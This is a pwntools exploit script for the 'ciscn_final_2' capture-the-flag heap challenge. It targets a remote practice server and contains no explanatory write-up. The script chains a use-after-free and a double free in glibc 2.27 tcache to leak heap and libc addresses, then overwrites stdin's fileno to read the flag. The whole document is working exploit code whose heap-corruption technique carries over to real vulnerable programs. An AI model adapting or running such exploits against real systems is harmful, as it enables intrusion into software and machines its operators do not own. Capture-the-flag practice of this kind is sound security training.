from pwn import *


ld_path = "/home/fanxinli/libc-so/libc-27/ld-2.27.so"
libc_path = "/home/fanxinli/libc-so/libc-2.27-64.so"
# p = process([ld_path, "./ciscn_final_2"], env={"LD_PRELOAD":libc_path})
# p = process([ld_path, ""])
# p = process("", env={"LD_PRELOAD":libc_path})
# p = process("")
p = remote("node4.buuoj.cn", 29559)

# context.log_level = "debug"

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()


def add(tp, num):
    sa("which command?\n> ", "1")
    sa("2: short int\n>", str(tp))
    sa("your inode number:", str(num))
    
def free(tp):
    sa("which command?\n> ", "2")
    sa("2: short int\n>", str(tp))

def show(tp):
    sa("which command?\n> ", "3")
    sa("2: short int\n>", str(tp))

def leave():
    sa("which command?\n> ", "4")
    # sla("what do you want to say at last? \n", con)


# uaf + double free

# alloc to chunk_0 
add(1, 0x30)   # chunk_0
free(1)
add(2, 0x20)
add(2, 0x20)
add(2, 0x20)
add(2, 0x20)
free(2)
add(1, 0x30)
free(2)
show(2)
ru("inode number :")
info = int(rud("\n"))
print(info, hex(info))

# change chunk_0 size
add(2, info-0xa0)
add(2, 0x20)
add(2, 0x91)

# leak libc
for i in range(0, 7):
    free(1)
    add(2, 0x20)
free(1)
show(1)
ru("inode number :")
info = int(rud("\n"))
print(hex(info))

# count
libc = ELF(libc_path)
base = info-0x70-libc.sym["__malloc_hook"]
fileno = base+libc.sym["_IO_2_1_stdin_"]+0x70 
print(hex(fileno))

# alloc to stdin.fileno
add(1, fileno)
add(1, 0x30)
free(1)
add(2, 0x20)
free(1)
show(1)
ru("inode number :")
info = int(rud("\n"))-0x30
add(1, info)
add(1, 0x30)
add(1, 0x30)
add(1, 666)  # alter stdin.fileno to "666", then scanf will read

# get flag
leave()

p.interactive()


